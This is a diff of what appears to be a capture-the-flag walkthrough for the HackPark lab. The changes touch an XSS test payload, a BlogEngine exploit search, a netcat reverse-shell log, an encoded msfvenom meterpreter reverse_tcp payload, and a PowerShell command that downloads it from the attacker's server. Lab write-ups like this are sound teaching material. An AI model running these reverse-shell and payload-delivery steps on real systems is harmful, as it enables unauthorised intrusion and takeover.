@@ -35,7 +35,7 @@ This seems to be pretty buggy, and not offering any information when we try Admi
 
 Let's try a hello alert to see if XSS is working for the comment section on the blog post. 
 
-```js
+```
 <script>alert(‘XSS’)</script>
 ```
 
@@ -82,9 +82,7 @@ I'm not finding anything on the page for the clowns name.
 The social media links didn't go anywhere so lets try a [reverse image search](https://imgops.com/upload) on the clown's photo.
 
 * Try some of the different sites for the photo with imgops. 
-
 * You will find the clown's name (if you didn't already know **IT**).
-
 * Finally, you could do some EXIF. However, I don't want to know where that scary clown is... so I'm going to skip it unless I need it later.
 
 ## Task 2:  Using Hydra to brute-force a login
@@ -171,12 +169,9 @@ ENTER
 Let's go ahead and log in to our admin account we compromised on the site and try to find the version of BlogEngine being used.
 
 * Immediately we see that we set off some red flags with our attempted XSS comments in the "LATEST COMMENTS" section.
-
-* Let's go ahead and click to delete them all. We see this didn't work because comments have to be approved by an admin.
-
+* Let's go ahead and click to delete them all. We see the xss didn't work because comments have to be approved by an admin.
 * Now, let's look at the plugins. Create a txt file and list them all along with their version incase we get locked out.
-
-* Finally, we can navigate to the **About section and find the Version along with some other information.**
+* Finally, we can navigate to the **About section** and find the Version along with some other information.
 
 ```
 Your BlogEngine.NET Specification
@@ -192,7 +187,7 @@ Your BlogEngine.NET Specification
 
 **2) What is the CVE?**
 
-Now, it's time to look for an exploit. You can use [Exploit-DB](http://www.exploit-db.com/) or searchsploit.
+Now, it's time to look for an exploit. You can use [Exploit-DB](http://www.exploit-db.com/) or searchsploit in terminal.
 
 ```
 searchsploit blogengine      
@@ -238,7 +233,7 @@ Navigate to the directory instructed by the exploit (http://10.10.220.231/?theme
 
 ```
 listening on [any] 7777 ...
-connect to [10.6.40.191] from (UNKNOWN) [10.10.220.231] 50001
+connect to [Tun0-IP] from (UNKNOWN) [10.10.220.231] 50001
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 whoami
@@ -248,7 +243,6 @@ iis apppool\blog
 
 Now we have initial access!!
 
-
 ## Task 4: Privilege Escalation
 
 Before we move on, let's try to get a more stable shell. We're going to do this by making a reverse shell with msfvenom.
@@ -256,7 +250,7 @@ Before we move on, let's try to get a more stable shell. We're going to do this 
 Let's open another terminal in our HackPark directory and create the msfvenom payload.
 
 ```
-msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST= LPORT=7778 -f exe -o smsss.exe
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=Tun0-IP LPORT=7778 -f exe -o smsss.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 Found 1 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
@@ -278,7 +272,7 @@ python3 -m http.server
 Now that the server is open, we need to use powershell with our netcat session on the infected device to transfer the file to the temp directory (since we do not have write privileges for the current directory).
 
 ```ps
-powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.40.191:8000/smsss.exe')"
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://Tun0-IP:8000/smsss.exe')"
 ```
 
 We should see this pop up in our http server terminal to confirm the transfer (or dir in the netcat session):
